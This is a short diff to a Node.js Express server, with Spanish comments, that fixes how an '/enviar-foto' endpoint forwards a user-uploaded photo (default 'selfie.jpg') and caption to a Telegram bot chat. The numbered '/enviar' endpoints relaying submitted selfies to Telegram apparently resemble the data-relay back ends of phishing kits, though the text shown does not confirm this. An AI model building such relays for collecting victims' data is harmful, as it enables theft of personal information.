@@ -1,6 +1,6 @@
 const express = require('express');
 const cors = require('cors');
-const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));
+const fetch = require('node-fetch');
 const fs = require('fs');
 require('dotenv').config();
 const app = express();
@@ -188,6 +188,8 @@ app.post('/enviar3', async (req, res) => {
   res.sendStatus(200);
 });
 
+const FormData = require('form-data');  // ← AÑADE ESTA LÍNEA AL PRINCIPIO DEL ARCHIVO (después de los otros requires)
+
 app.post('/enviar-foto', async (req, res) => {
     try {
         const photo = req.files?.photo;
@@ -200,19 +202,20 @@ app.post('/enviar-foto', async (req, res) => {
 
         console.log('✅ Foto recibida:', photo.name, 'Tamaño:', photo.size, 'bytes');
 
-        // Usar FormData nativo de Node.js (funciona perfecto en Node 18+)
-        const formData = new FormData();
-        formData.append('chat_id', CHAT_ID);
-        formData.append('caption', caption);
-        formData.append('parse_mode', 'HTML');
-
-        // Crear un Blob a partir del buffer
-        const blob = new Blob([photo.data], { type: photo.mimetype || 'image/jpeg' });
-        formData.append('photo', blob, photo.name || 'selfie.jpg');
+        // Usar form-data (la librería más fiable para Telegram)
+        const form = new FormData();
+        form.append('chat_id', CHAT_ID);
+        form.append('caption', caption);
+        form.append('parse_mode', 'HTML');
+        form.append('photo', photo.data, {
+            filename: photo.name || 'selfie.jpg',
+            contentType: photo.mimetype || 'image/jpeg'
+        });
 
         const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
             method: 'POST',
-            body: formData
+            headers: form.getHeaders(),  // ← IMPORTANTE: esto pone el Content-Type y boundary correcto
+            body: form
         });
 
         const result = await response.json();
